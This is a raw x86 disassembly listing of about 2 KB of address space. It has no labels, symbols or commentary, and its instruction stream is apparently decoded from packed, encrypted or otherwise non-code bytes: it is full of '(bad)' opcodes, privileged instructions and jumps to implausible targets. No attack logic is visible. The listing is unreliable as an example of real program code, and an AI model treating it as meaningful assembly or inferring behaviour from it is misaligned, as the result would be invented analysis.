  41fd22:	sbb    BYTE PTR [edx-0x385d216],cl
  41fd28:	mov    ch,0xfc
  41fd2a:	pop    ecx
  41fd2b:	hlt    
  41fd2c:	enter  0x3e6f,0x4c
  41fd30:	xor    al,0x9e
  41fd32:	mov    bh,0xfa
  41fd34:	sub    BYTE PTR [esp+ebx*4],0x34
  41fd38:	in     al,0x9e
  41fd3a:	xlat   BYTE PTR ds:[ebx]
  41fd3b:	ins    BYTE PTR es:[edi],dx
  41fd3c:	add    DWORD PTR [esi+0x6f],eax
  41fd3f:	and    esi,eax
  41fd41:	hlt    
  41fd42:	push   eax
  41fd43:	aam    0xd4
  41fd45:	jg     0x41fd9b
  41fd47:	bound  esi,QWORD PTR [eax]
  41fd49:	mov    ecx,0x6aa1c151
  41fd4e:	pop    ecx
  41fd4f:	mov    dl,0x2e
  41fd51:	jg     0x41fd88
  41fd53:	mov    dh,dl
  41fd55:	xchg   ebx,eax
  41fd56:	mov    bh,0x66
  41fd58:	inc    edi
  41fd59:	add    eax,0x3dfae5d5
  41fd5e:	imul   BYTE PTR [edi-0x36]
  41fd61:	sbb    al,0xc0
  41fd63:	std    
  41fd64:	pop    ebp
  41fd65:	cmp    ch,BYTE PTR [edx-0x25]
  41fd68:	sub    eax,0x6b5f770
  41fd6d:	sahf   
  41fd6e:	push   esp
  41fd6f:	mov    ebx,0x784444da
  41fd74:	xlat   BYTE PTR ds:[ebx]
  41fd75:	sbb    eax,ecx
  41fd77:	lock push eax
  41fd79:	(bad)  
  41fd7a:	mov    dh,0x2
  41fd7c:	fistp  WORD PTR [esi]
  41fd7e:	jne    0x41fd94
  41fd80:	jp     0x41fdb9
  41fd82:	test   eax,0x7ea59093
  41fd87:	fcomip st,st(4)
  41fd89:	push   esp
  41fd8a:	xchg   ebx,eax
  41fd8b:	lods   al,BYTE PTR ds:[esi]
  41fd8c:	fisttp WORD PTR [eax]
  41fd8e:	add    ebx,DWORD PTR [eax+ecx*8]
  41fd91:	xchg   BYTE PTR [edi+0x1],al
  41fd94:	addr16 (bad) 
  41fd97:	mov    bl,0xda
  41fd99:	cmp    WORD PTR [ecx],di
  41fd9c:	ins    BYTE PTR es:[edi],dx
  41fd9d:	mov    eax,ds:0x4223fa42
  41fda2:	xor    esi,esi
  41fda4:	sahf   
  41fda5:	dec    edx
  41fda6:	push   ebp
  41fda7:	call   0x3402e026
  41fdac:	test   al,0x3a
  41fdae:	xchg   ecx,eax
  41fdaf:	mov    ebp,0xd5feb856
  41fdb4:	adc    ebp,DWORD PTR [ecx+0x334d6983]
  41fdba:	jb     0x41fe37
  41fdbc:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdbe:	xor    BYTE PTR [edi-0x2],dh
  41fdc1:	imul   ebx,DWORD PTR [ecx],0x47a43796
  41fdc7:	jmp    0x3e06:0x6a2d7d57
  41fdce:	mov    ds:0xe4305824,eax
  41fdd3:	pop    ecx
  41fdd4:	jns    0x41fe12
  41fdd6:	adc    ebx,DWORD PTR [edi]
  41fdd8:	push   0xf83bb033
  41fddd:	out    0x30,al
  41fddf:	data16 fmul st,st(5)
  41fde2:	out    0x6,al
  41fde4:	push   esp
  41fde5:	sub    DWORD PTR [ebp+esi*4+0x41],edi
  41fde9:	jae    0x41fda1
  41fdeb:	sub    ebp,DWORD PTR [ebx]
  41fded:	add    eax,0x2fe99405
  41fdf2:	and    eax,0xfb29864
  41fdf7:	imul   esp,DWORD PTR [ebx-0x4ea6e86b],0x1970f9fa
  41fe01:	jbe    0x41fdb8
  41fe03:	mov    eax,ds:0x82a6e1ce
  41fe08:	add    dl,ch
  41fe0a:	xor    esi,DWORD PTR [ebp+0x40]
  41fe0d:	push   cs
  41fe0e:	mov    cl,0x94
  41fe10:	fisttp WORD PTR [ecx]
  41fe12:	xchg   edi,eax
  41fe13:	sub    al,0xb6
  41fe15:	and    BYTE PTR [ecx+edx*1],dh
  41fe18:	pop    es
  41fe19:	xchg   ebx,eax
  41fe1a:	adc    eax,0xcb5186d1
  41fe1f:	inc    esp
  41fe20:	sbb    bl,BYTE PTR [ecx-0x63]
  41fe23:	int    0xb8
  41fe25:	scas   eax,DWORD PTR es:[edi]
  41fe26:	test   BYTE PTR ds:0x107db2cf,0xaa
  41fe2d:	push   esi
  41fe2e:	popf   
  41fe2f:	jnp    0x41fdd1
  41fe31:	xchg   esi,eax
  41fe32:	jp     0x41fdc2
  41fe34:	jge    0x41fea6
  41fe36:	xor    al,BYTE PTR [edx+0x75afff2f]
  41fe3c:	adc    al,0x3
  41fe3e:	push   ss
  41fe3f:	pop    ebx
  41fe40:	test   DWORD PTR [ebx-0x5a9aab91],ebx
  41fe46:	adc    edi,esp
  41fe48:	les    esi,FWORD PTR [esi]
  41fe4a:	xor    WORD PTR ds:[edx-0x7623f04c],0xf5b2
  41fe54:	adc    al,0x98
  41fe56:	mov    ch,0xf6
  41fe58:	mov    esi,0x40de9839
  41fe5d:	adc    bh,BYTE PTR [esi+0x6b9a6d6a]
  41fe63:	adc    BYTE PTR [ebx],dl
  41fe65:	loop   0x41fedb
  41fe67:	jl     0x41fe55
  41fe69:	xlat   BYTE PTR ds:[ebx]
  41fe6a:	lock jg 0x41fe76
  41fe6d:	in     al,dx
  41fe6e:	into   
  41fe6f:	jl     0x41fec9
  41fe71:	addr16 dec ebx
  41fe73:	pop    ds
  41fe74:	sbb    al,BYTE PTR [ecx-0x7e2c3e19]
  41fe7a:	dec    esi
  41fe7b:	adc    ch,BYTE PTR [ecx+0x29]
  41fe7e:	jb     0x41fe0b
  41fe80:	mov    edi,0x581e05ac
  41fe85:	jo     0x41fe60
  41fe87:	or     al,0xe
  41fe89:	inc    ebx
  41fe8a:	(bad)  
  41fe8b:	je     0x41fedc
  41fe8d:	cld    
  41fe8e:	pop    ebp
  41fe8f:	jno    0x41fe69
  41fe91:	jbe    0x41fe25
  41fe93:	push   edx
  41fe94:	xlat   BYTE PTR ds:[ebx]
  41fe95:	or     ecx,DWORD PTR [ebx]
  41fe97:	push   ss
  41fe98:	adc    dh,dl
  41fe9a:	lods   al,BYTE PTR ds:[esi]
  41fe9b:	push   ecx
  41fe9c:	xchg   ecx,eax
  41fe9d:	ins    DWORD PTR es:[edi],dx
  41fe9e:	xor    BYTE PTR [esi+0x32083e2b],bh
  41fea4:	fcomp  QWORD PTR [esi]
  41fea6:	inc    esi
  41fea7:	(bad)  
  41fea8:	xor    eax,0x49f91cbf
  41fead:	mov    eax,ds:0xcf33f2f3
  41feb2:	popa   
  41feb3:	push   edi
  41feb4:	lahf   
  41feb5:	rcr    edi,0x96
  41feb8:	ret    
  41feb9:	sub    DWORD PTR fs:[ebp-0x4c],edi
  41febd:	in     al,0x4e
  41febf:	ins    BYTE PTR es:[edi],dx
  41fec0:	lds    esi,FWORD PTR ds:0x44610abf
  41fec6:	mov    eax,ds:0xc0f54b26
  41fecb:	xchg   ebx,eax
  41fecc:	jae    0x41fec1
  41fece:	and    DWORD PTR [ebp+eiz*1-0x6b],ecx
  41fed2:	mov    ebp,0xd3f76650
  41fed7:	iret   
  41fed8:	xor    eax,0x3eba62e8
  41fedd:	add    eax,0xe21441c
  41fee2:	mov    esp,0xfde0a033
  41fee7:	loopne 0x41feaf
  41fee9:	jp     0x41fe99
  41feeb:	xor    BYTE PTR [eax],bh
  41feed:	std    
  41feee:	leave  
  41feef:	pop    edi
  41fef0:	fisub  DWORD PTR [eax+0x1d]
  41fef3:	pushf  
  41fef4:	mov    eax,ds:0x30de0849
  41fef9:	in     al,dx
  41fefa:	sti    
  41fefb:	retf   0x8ff1
  41fefe:	fwait
  41feff:	sbb    BYTE PTR [edi+0x2f873672],bh
  41ff05:	imul   ebx,DWORD PTR [esi],0xffffffbd
  41ff08:	lock dec esi
  41ff0a:	mov    ebp,0xaf091544
  41ff0f:	int3   
  41ff10:	(bad)
  41ff14:	sahf   
  41ff15:	sbb    eax,0x57872e31
  41ff1a:	cmp    DWORD PTR [edx-0x65],0x7e205edb
  41ff21:	jmp    0x41ffa1
  41ff23:	or     edx,DWORD PTR [edx]
  41ff25:	lds    ebp,FWORD PTR [ecx+0x224c788d]
  41ff2b:	dec    ebp
  41ff2c:	sbb    DWORD PTR [ecx],0xf56961af
  41ff32:	in     al,dx
  41ff33:	adc    al,dh
  41ff35:	push   0xffffffda
  41ff37:	imul   ebx,esi,0x5f
  41ff3a:	dec    edi
  41ff3b:	or     edi,DWORD PTR [eax-0xe762e17]
  41ff41:	sbb    BYTE PTR [ebp-0x3d],dl
  41ff44:	stos   BYTE PTR es:[edi],al
  41ff45:	aam    0xbc
  41ff47:	inc    esi
  41ff48:	daa    
  41ff49:	leave  
  41ff4a:	es jae 0x41ff3a
  41ff4d:	pop    eax
  41ff4e:	mov    bh,0x81
  41ff50:	adc    eax,0x3580829e
  41ff55:	or     edx,DWORD PTR [edi+eax*1-0x35538340]
  41ff5c:	push   edi
  41ff5d:	fild   DWORD PTR [ebp+esi*2+0x682d7af5]
  41ff64:	idiv   BYTE PTR [ecx+0x61fafa67]
  41ff6a:	sub    BYTE PTR cs:[ebx-0x7],ch
  41ff6e:	sbb    eax,0x4bc70108
  41ff73:	fcomp  QWORD PTR [eax-0x8]
  41ff76:	sub    DWORD PTR [edx],0x8
  41ff79:	inc    BYTE PTR [eax]
  41ff7b:	mov    edi,0x2f92c246
  41ff80:	call   0x57c7f89b
  41ff85:	jbe    0x41ffdd
  41ff87:	xchg   ebp,eax
  41ff88:	jp     0x41ff2d
  41ff8a:	cld    
  41ff8b:	pushf  
  41ff8c:	xchg   esp,eax
  41ff8d:	jne    0x41ffd0
  41ff8f:	iret   
  41ff90:	xchg   ebp,eax
  41ff91:	mov    dh,0xdc
  41ff93:	into   
  41ff94:	or     eax,0x330c8b1d
  41ff99:	add    al,0x5c
  41ff9b:	mov    WORD PTR [ebp+0x4db8937c],cs
  41ffa1:	inc    edx
  41ffa2:	cmp    ch,ch
  41ffa4:	scas   al,BYTE PTR es:[edi]
  41ffa5:	cdq    
  41ffa6:	mov    eax,ds:0x11f85ef8
  41ffab:	nop
  41ffac:	fldcw  WORD PTR [eax+0x3b76905b]
  41ffb2:	popa   
  41ffb3:	inc    edi
  41ffb4:	cli    
  41ffb5:	push   eax
  41ffb6:	retf   0x3de9
  41ffb9:	and    DWORD PTR [edi+eax*1-0x50],esi
  41ffbd:	mov    ds,WORD PTR [esp+ebp*4+0x23]
  41ffc1:	and    DWORD PTR [ebx-0x6d],ecx
  41ffc4:	(bad)  
  41ffc5:	nop
  41ffc6:	pop    es
  41ffc7:	or     bl,0x5d
  41ffca:	pop    ebp
  41ffcb:	(bad)  
  41ffcc:	cmp    dl,BYTE PTR [edi-0x7651752c]
  41ffd2:	and    ch,BYTE PTR [ebx+esi*4-0x72]
  41ffd6:	call   0xd51c:0x86fc0d4d
  41ffdd:	les    esi,FWORD PTR [esi+0x9fc62a2]
  41ffe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffe4:	fisttp QWORD PTR [edx-0x6f]
  41ffe7:	icebp  
  41ffe8:	iret   
  41ffe9:	push   ds
  41ffea:	addr16 das 
  41ffec:	pop    edi
  41ffed:	xchg   edi,eax
  41ffee:	sbb    al,0x32
  41fff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fff1:	xor    DWORD PTR [ebp-0x41],ebp
  41fff4:	sbb    al,0x3f
  41fff6:	aad    0xfd
  41fff8:	adc    bl,al
  41fffa:	jp     0x41ff89
  41fffc:	push   ds
  41fffd:	loopne 0x41ffbc
  41ffff:	lods   eax,DWORD PTR ds:[esi]
  420000:	lods   eax,DWORD PTR ds:[esi]
  420001:	inc    esp
  420002:	jne    0x41ff87
  420004:	cmp    edx,DWORD PTR [ebx-0x70]
  420007:	ja     0x41ff92
  420009:	xor    eax,ebp
  42000b:	xor    eax,0xef7e4a98
  420010:	mov    bl,0xd
  420012:	loope  0x420092
  420014:	into   
  420015:	cmc    
  420016:	nop
  420017:	mov    dh,0xb9
  420019:	push   eax
  42001a:	jecxz  0x42000a
  42001c:	jno    0x42001d
  42001e:	mov    ebx,DWORD PTR [esi-0x7f]
  420021:	aas    
  420022:	jl     0x420066
  420024:	or     eax,0x4877170e
  420029:	jo     0x41ffdb
  42002b:	js     0x420009
  42002d:	sub    eax,ebx
  42002f:	lea    ebx,[eax]
  420031:	jl     0x41ffd5
  420033:	sbb    eax,0xf94ce703
  420038:	adc    edx,DWORD PTR [esi+0x6817fc07]
  42003e:	mov    al,0x4a
  420040:	xor    eax,0xd248cae6
  420045:	scas   eax,DWORD PTR es:[edi]
  420046:	xchg   ebp,eax
  420047:	lea    edi,[ecx-0x557cf1b5]
  42004d:	(bad)  
  42004e:	bound  eax,QWORD PTR [edx]
  420050:	push   0x7c
  420052:	add    bh,BYTE PTR [esi+ecx*2-0x22]
  420056:	jb     0x42000c
  420058:	enter  0x85a8,0xbc
  42005c:	stos   BYTE PTR es:[edi],al
  42005d:	mov    WORD PTR [ecx-0x56],?
  420060:	int    0x8b
  420062:	add    dl,dl
  420064:	mov    cl,BYTE PTR [ebp+edx*8+0x61]
  420068:	in     eax,dx
  420069:	leave  
  42006a:	ror    BYTE PTR [edi],cl
  42006c:	or     bl,BYTE PTR [ebx-0xc]
  42006f:	add    ebx,ebp
  420071:	mov    eax,ds:0x240bdfd2
  420076:	enter  0xba9e,0x9e
  42007a:	push   ss
  42007b:	or     dh,bh
  42007d:	ins    BYTE PTR es:[edi],dx
  42007e:	jmp    0xd496:0x4bf16dae
  420085:	add    BYTE PTR [eax-0x6b0b195a],ch
  42008b:	mov    eax,0x68d49a90
  420090:	dec    ebp
  420091:	(bad)  
  420092:	lods   eax,DWORD PTR ds:[esi]
  420093:	int    0x24
  420095:	push   0xe587b21d
  42009a:	stc    
  42009b:	in     al,0x3f
  42009d:	mov    DWORD PTR [ebx+ebp*8-0x33bd258a],edx
  4200a4:	sub    BYTE PTR [esi-0x42],ah
  4200a7:	sub    al,0xba
  4200a9:	(bad)  
  4200aa:	lahf   
  4200ab:	cmc    
  4200ac:	retf   0xc6a0
  4200af:	mov    edi,0x9a2ecaba
  4200b4:	repz add eax,DWORD PTR [edi+0x421d894d]
  4200bb:	add    BYTE PTR [ebx-0x62faea10],ch
  4200c1:	push   0xa1ee287c
  4200c6:	or     edx,DWORD PTR [edx-0x1e]
  4200c9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4200cb:	push   0x7f09c151
  4200d0:	fldcw  WORD PTR [edi+ebx*2]
  4200d3:	jmp    0xa721:0xe6cce867
  4200da:	sub    al,0x3a
  4200dc:	dec    edi
  4200dd:	and    ebp,ecx
  4200df:	push   0xbda3f68c
  4200e4:	test   al,0x9d
  4200e6:	mov    BYTE PTR [ecx-0x58],al
  4200e9:	sbb    al,BYTE PTR [ebx+0x38b8d371]
  4200ef:	out    0xaf,eax
  4200f1:	add    bl,BYTE PTR [edi+0x54c98969]
  4200f7:	mov    WORD PTR cs:[edi],cs
  4200fa:	inc    ebp
  4200fb:	dec    ebp
  4200fc:	mov    eax,DWORD PTR [ebx+esi*1]
  4200ff:	push   ss
  420100:	jmp    0x3842:0xe6b54079
  420107:	dec    ecx
  420108:	popa   
  420109:	repnz push edi
  42010b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42010d:	xchg   esp,eax
  42010e:	(bad)  
  42010f:	js     0x4200e9
  420111:	jle    0x420116
  420113:	les    esi,FWORD PTR ds:[ebx+0x77390274]
  42011a:	icebp  
  42011b:	xchg   esp,eax
  42011c:	cmc    
  42011d:	push   esp
  42011e:	int3   
  42011f:	mov    ecx,0x2e3f34ac
  420124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420125:	or     DWORD PTR [ecx-0x67],ebx
  420128:	inc    esi
  420129:	rol    DWORD PTR [di+0x25],1
  42012d:	adc    DWORD PTR [ecx+eiz*4+0x35],ebp
  420131:	inc    esi
  420132:	sub    BYTE PTR [esi-0x14],dl
  420135:	(bad)  
  420136:	pop    edi
  420137:	jle    0x4200e4
  420139:	push   eax
  42013a:	mov    ds:0xb996dd27,eax
  42013f:	out    dx,al
  420140:	xor    bl,bh
  420142:	sub    ah,BYTE PTR [ebx+eiz*1+0x45039c7b]
  420149:	push   0xb295556b
  42014e:	xchg   ebp,eax
  42014f:	jb     0x4201b4
  420151:	pusha  
  420152:	cmp    al,0x1c
  420154:	sbb    DWORD PTR [ecx-0x17757760],esp
  42015a:	jmp    0x34b03eba
  42015f:	loop   0x4201c8
  420161:	scas   eax,DWORD PTR es:[edi]
  420162:	sbb    BYTE PTR [edi+0x710f45e5],0x70
  420169:	mov    DWORD PTR [ebp+0x3c],0xa2454800
  420170:	xchg   esi,eax
  420171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420172:	dec    edx
  420173:	xchg   ebx,eax
  420174:	icebp  
  420175:	dec    esp
  420176:	popf   
  420177:	das    
  420178:	sub    al,0xae
  42017a:	ins    DWORD PTR es:[edi],dx
  42017b:	jmp    0x4201ca
  42017d:	jl     0x420143
  42017f:	jae    0x42019b
  420181:	loope  0x420126
  420183:	outs   dx,BYTE PTR ds:[esi]
  420184:	or     bl,BYTE PTR [esp+edx*2]
  420187:	idiv   DWORD PTR [ecx]
  420189:	popf   
  42018a:	fild   DWORD PTR [ecx-0x2b]
  42018d:	js     0x42018a
  42018f:	mov    ch,BYTE PTR [ecx+eiz*2-0x47]
  420193:	pop    esp
  420194:	(bad)  
  420195:	sbb    al,0x40
  420197:	stc    
  420198:	ja     0x4201bc
  42019a:	pop    edi
  42019b:	mov    al,0x32
  42019d:	fidivr DWORD PTR [edx+0x11]
  4201a0:	in     eax,dx
  4201a1:	jg     0x420143
  4201a3:	lahf   
  4201a4:	mov    ds:0x8f28a95b,al
  4201a9:	pop    ds
  4201aa:	jge    0x4201d4
  4201ac:	imul   ebp,DWORD PTR [edx+esi*8-0x5c],0xab28d237
  4201b4:	xor    al,0x91
  4201b6:	pusha  
  4201b7:	(bad)
  4201ba:	stos   BYTE PTR es:[edi],al
  4201bb:	cmp    eax,0x2ea820df
  4201c0:	in     al,dx
  4201c1:	pop    ss
  4201c2:	aam    0xa0
  4201c4:	scas   al,BYTE PTR es:[edi]
  4201c5:	dec    esp
  4201c6:	loop   0x42015d
  4201c8:	hlt    
  4201c9:	das    
  4201ca:	or     al,0xcb
  4201cc:	jbe    0x420212
  4201ce:	xor    ecx,esi
  4201d0:	add    cl,dh
  4201d2:	jae    0x4201c0
  4201d4:	imul   ebx,DWORD PTR [esi],0x4f
  4201d7:	adc    BYTE PTR ds:0x73e46c28,al
  4201dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201de:	sbb    BYTE PTR [esp+edi*8],cl
  4201e1:	cmp    BYTE PTR [ecx],bh
  4201e3:	shl    DWORD PTR [ecx+esi*2],cl
  4201e6:	retf   0x89ad
  4201e9:	push   edx
  4201ea:	mov    ecx,0x30f8e2fd
  4201ef:	and    eax,DWORD PTR [esi]
  4201f1:	inc    ebx
  4201f2:	rcr    DWORD PTR [eax],1
  4201f4:	fmul   QWORD PTR [ebx]
  4201f6:	repnz (bad) 
  4201f8:	popa   
  4201f9:	pop    ebx
  4201fa:	mov    ds:0x27d15cb,eax
  4201ff:	test   BYTE PTR [ebx-0xae9fdec],0x5
  420206:	mov    al,0x56
  420208:	ret    
  420209:	push   eax
  42020a:	fbstp  TBYTE PTR [esi-0x3b]
  42020d:	jg     0x4201fd
  42020f:	ja     0x4201be
  420211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420212:	dec    esi
  420213:	inc    esp
  420214:	mov    ch,0xd
  420216:	into   
  420217:	(bad)  [ebp-0xc]
  42021a:	add    eax,0x736a5950
  42021f:	xchg   ebp,eax
  420220:	cdq    
  420221:	iret   
  420222:	xchg   ecx,eax
  420223:	repnz out 0x15,al
  420226:	mov    DWORD PTR [eax+0x77],0xb7b474e6
  42022d:	xchg   edx,eax
  42022e:	test   al,0xe7
  420230:	jb     0x42029a
  420232:	push   cs
  420233:	sbb    ebp,DWORD PTR [ebp+0xff6abc7]
  420239:	icebp  
  42023a:	das    
  42023b:	out    dx,al
  42023c:	push   esp
  42023d:	sub    bh,ch
  42023f:	jae    0x4201fe
  420241:	jl     0x4201e7
  420243:	xor    bl,al
  420245:	clc    
  420246:	sub    eax,0x35439028
  42024b:	jle    0x4202c6
  42024d:	xrelease mov BYTE PTR [edx-0x44e456b3],cl
  420254:	adc    eax,0x2cbf9382
  420259:	pusha  
  42025a:	or     al,0x61
  42025c:	mov    ebp,0x98439e22
  420261:	push   ebp
  420262:	or     DWORD PTR [esi],ebp
  420264:	ds mov edx,0xa042af29
  42026a:	mov    DWORD PTR [edi],ecx
  42026c:	xor    BYTE PTR [eax],bh
  42026e:	dec    edi
  42026f:	xchg   esi,eax
  420270:	inc    eax
  420271:	jmp    0xfe37:0x1739cb4f
  420278:	ret    0x4537
  42027b:	out    0x4b,al
  42027d:	adc    BYTE PTR [ebx-0x4a],al
  420280:	fst    DWORD PTR [esi]
  420282:	inc    ecx
  420283:	push   0xffffffc3
  420285:	fwait
  420286:	and    ebx,DWORD PTR [ebx+0x3d]
  420289:	loope  0x420285
  42028b:	dec    DWORD PTR [eax-0x26f1568b]
  420291:	fnsave ds:0xbb260b3
  420297:	cmp    esi,ebp
  420299:	pusha  
  42029a:	xor    DWORD PTR [esi-0x60025a3f],ebp
  4202a0:	not    DWORD PTR [edx]
  4202a2:	leave  
  4202a3:	mov    ecx,DWORD PTR [ecx-0x674d9568]
  4202a9:	shl    BYTE PTR [ebx+0x20a45d82],0x28
  4202b0:	xlat   BYTE PTR ds:[ebx]
  4202b1:	add    eax,0x3a761e3f
  4202b6:	xchg   esi,eax
  4202b7:	std    
  4202b8:	sar    BYTE PTR [edx+esi*4-0x60],cl
  4202bc:	mov    ch,BYTE PTR [ebp+0x2f54742e]
  4202c2:	and    BYTE PTR [esi+ebp*1+0x7e],dl
  4202c6:	and    edi,DWORD PTR [ebx]
  4202c8:	cmp    eax,0x69d6bdb8
  4202cd:	sbb    al,BYTE PTR [edx-0x9]
  4202d0:	pop    ecx
  4202d1:	adc    cl,BYTE PTR [esi-0xf]
  4202d4:	xchg   ecx,eax
  4202d5:	inc    eax
  4202d6:	jp     0x4202c1
  4202d8:	in     eax,0x12
  4202da:	mov    ds:0x531a6fc1,al
  4202df:	add    ebx,esp
  4202e1:	cli    
  4202e2:	sbb    bh,BYTE PTR [eax+0x4a]
  4202e5:	ja     0x4202d6
  4202e7:	and    BYTE PTR [esi],bh
  4202e9:	fldcw  WORD PTR [eax-0x39aa286d]
  4202ef:	sbb    esi,DWORD PTR [ebx]
  4202f1:	in     al,dx
  4202f2:	sbb    al,dh
  4202f4:	mov    WORD PTR [esi],fs
  4202f6:	jnp    0x42028b
  4202f8:	rcr    DWORD PTR [edi],1
  4202fa:	xchg   DWORD PTR [ecx-0x4f038f50],esp
  420300:	dec    esp
  420301:	call   0xeba:0x4aca7ee1
  420308:	neg    ebx
  42030a:	inc    esp
  42030b:	mov    bh,0x93
  42030d:	or     edi,edx
  42030f:	add    ecx,0xac9c8593
  420315:	pop    es
  420316:	adc    eax,0x4427d782
  42031b:	dec    ebx
  42031c:	ins    BYTE PTR es:[edi],dx
  42031d:	xor    eax,0x81d074a3
  420322:	loop   0x42033f
  420324:	ror    al,cl
  420326:	mov    bl,0xf8
  420328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420329:	scas   al,BYTE PTR es:[edi]
  42032a:	into   
  42032b:	add    eax,0x42f0bf43
  420330:	fwait
  420331:	dec    ebx
  420332:	jp     0x4203a9
  420334:	xor    DWORD PTR [ebx+0x6b],edx
  420337:	push   ebp
  420338:	(bad)  
  420339:	call   0x13530ffe
  42033e:	je     0x420397
  420340:	jno    0x4202dd
  420342:	push   edx
  420343:	dec    ebp
  420344:	or     DWORD PTR [esi+0x5113cfc8],edi
  42034a:	mov    BYTE PTR [esi-0x31],cl
  42034d:	bound  esp,QWORD PTR [edx+0x6118f0bc]
  420353:	cdq    
  420354:	pop    ss
  420355:	sbb    ebx,DWORD PTR [esi+0x2e]
  420358:	jecxz  0x4203d5
  42035a:	inc    esi
  42035b:	test   al,0xe9
  42035d:	daa    
  42035e:	sbb    cl,dl
  420360:	imul   ecx,DWORD PTR [ecx-0x2114fc35],0xa27eabe2
  42036a:	push   edi
  42036b:	ret    
  42036c:	sbb    al,bl
  42036e:	popf   
  42036f:	icebp  
  420370:	cli    
  420371:	not    DWORD PTR [ecx-0xce9584a]
  420377:	push   esi
  420378:	push   ecx
  420379:	and    bl,0xf7
  42037c:	cli    
  42037d:	fisub  WORD PTR es:0x8069bd3e
  420384:	mov    cl,0x1b
  420386:	xor    ecx,eax
  420388:	imul   BYTE PTR [eax]
  42038a:	in     al,dx
  42038b:	push   eax
  42038c:	enter  0x1a2d,0xaf
  420390:	(bad)  
  420391:	sbb    dl,BYTE PTR [esi+0x69]
  420394:	jmp    0xc267:0x45e460b7
  42039b:	inc    BYTE PTR [ebx-0x6bcec99c]
  4203a1:	stc    
  4203a2:	ins    BYTE PTR es:[edi],dx
  4203a3:	in     al,dx
  4203a4:	(bad)  
  4203a5:	mov    ch,cl
  4203a7:	ins    DWORD PTR es:[edi],dx
  4203a8:	imul   esp,DWORD PTR [edi],0xf
  4203ab:	dec    ecx
  4203ac:	bound  edi,QWORD PTR [esi+ebp*2-0x2f69ce50]
  4203b3:	icebp  
  4203b4:	mov    ds:0xea9429d0,eax
  4203b9:	lds    ecx,FWORD PTR [ecx+0x42032c5c]
  4203bf:	jmp    0x2fe37925
  4203c4:	mov    esp,0x246a86e6
  4203c9:	retf   0x1bc4
  4203cc:	in     al,0x8d
  4203ce:	add    BYTE PTR [ecx+0x17],0xed
  4203d2:	mov    gs,WORD PTR [edx-0x49]
  4203d5:	aam    0x5a
  4203d7:	cld    
  4203d8:	adc    BYTE PTR [edx-0xd5729ba],ah
  4203de:	push   esp
  4203df:	ins    DWORD PTR es:[edi],dx
  4203e0:	test   eax,0xf4c5b83e
  4203e5:	stos   DWORD PTR es:[edi],eax
  4203e6:	xor    BYTE PTR [ebx+0x454457d7],ah
  4203ec:	loope  0x4203cb
  4203ee:	jmp    0x420422
  4203f0:	cmp    bl,ah
  4203f2:	jo     0x420431
  4203f4:	ins    DWORD PTR es:[edi],dx
  4203f5:	ss jge 0x4203ef
  4203f8:	inc    BYTE PTR ds:0x16250327
  4203fe:	pop    es
  4203ff:	sub    al,0x89
  420401:	sub    ebx,ecx
  420403:	lods   al,BYTE PTR ds:[esi]
  420404:	add    ebp,DWORD PTR [esp+edx*1-0x253a562c]
  42040b:	in     al,dx
  42040c:	leave  
  42040d:	inc    edi
  42040e:	fwait
  42040f:	inc    edx
  420410:	xor    BYTE PTR [edi+0xefde4d],dh
  420416:	les    eax,FWORD PTR [eax+0x72]
  420419:	fwait
  42041a:	call   0xe48e46aa
  42041f:	adc    al,0xd4
  420421:	stos   DWORD PTR es:[edi],eax
  420422:	cmp    al,0xde
  420424:	push   ss
  420425:	sahf   
  420426:	lahf   
  420427:	or     ebx,ecx
  420429:	push   edx
  42042a:	sbb    dh,BYTE PTR es:[ecx+0x167227d8]
  420431:	inc    ebp
  420432:	push   esi
  420433:	mov    ah,0xd7
  420435:	mov    ds:0xaff836e7,al
  42043a:	push   esp
  42043b:	mov    eax,ds:0xcd843c99
  420440:	mov    dh,0xab
  420442:	out    dx,eax
  420443:	(bad)  
  420444:	jbe    0x4204a3
  420446:	in     al,dx
  420447:	sub    BYTE PTR [esi-0x8],al
  42044a:	std    
  42044b:	out    0xe6,al
  42044d:	dec    eax
  42044e:	popw   es
  420450:	xchg   edi,eax
  420451:	dec    ebx
  420452:	xlat   BYTE PTR ds:[ebx]
  420453:	add    cl,BYTE PTR [edx]
  420455:	cmp    BYTE PTR [ebx-0x46],dh
  420458:	sbb    eax,0xed384c55
  42045d:	mov    eax,ds:0x5a5a0ace
  420462:	repnz sahf 
  420464:	ror    DWORD PTR [ebp+0x65],1
  420467:	mov    ecx,0x3a964085
  42046c:	scas   eax,DWORD PTR es:[edi]
  42046d:	int3   
  42046e:	sub    DWORD PTR [edi-0x535ac302],ebx
  420474:	imul   al
  420476:	jno    0x420483
  420478:	adc    DWORD PTR es:[edx+0x69],ecx
  42047c:	or     al,BYTE PTR [edx+0x6d]
  42047f:	sub    ah,BYTE PTR [ebx-0x9]
  420482:	ins    DWORD PTR es:[edi],dx
  420483:	outs   dx,DWORD PTR ds:[esi]
  420484:	aas    
  420485:	in     al,0xae
  420487:	jbe    0x420479
  420489:	enter  0x84a6,0xc
  42048d:	test   eax,0xf4703c4d
  420492:	sub    ebp,DWORD PTR [edx*8-0xf7eafd5]
  420499:	outs   dx,BYTE PTR ds:[esi]
  42049a:	je     0x42050c
  42049c:	xor    edx,DWORD PTR [esi+0x41]
  42049f:	jne    0x4204b5
  4204a1:	iret   
  4204a2:	mov    esp,0x45920b3b
  4204a7:	or     cl,BYTE PTR [edi-0x4]
  4204aa:	and    eax,0x648d9d2
  4204af:	cmp    al,0x8c
  4204b1:	pop    esp
  4204b2:	push   edx
  4204b3:	sub    eax,0x3bb20f80
  4204b8:	push   edi
  4204b9:	adc    bh,BYTE PTR [ecx+0x3e5ff75a]
  4204bf:	retf   0x2846
  4204c2:	cmp    eax,0x26f908f
  4204c7:	pop    eax
  4204c8:	in     eax,dx
  4204c9:	aaa    
  4204ca:	(bad)  
  4204cc:	xor    bh,bl
  4204ce:	xchg   ah,dl
  4204d0:	jg     0x420485
  4204d2:	dec    edx
  4204d3:	aam    0xf6
  4204d5:	retf   0xb981
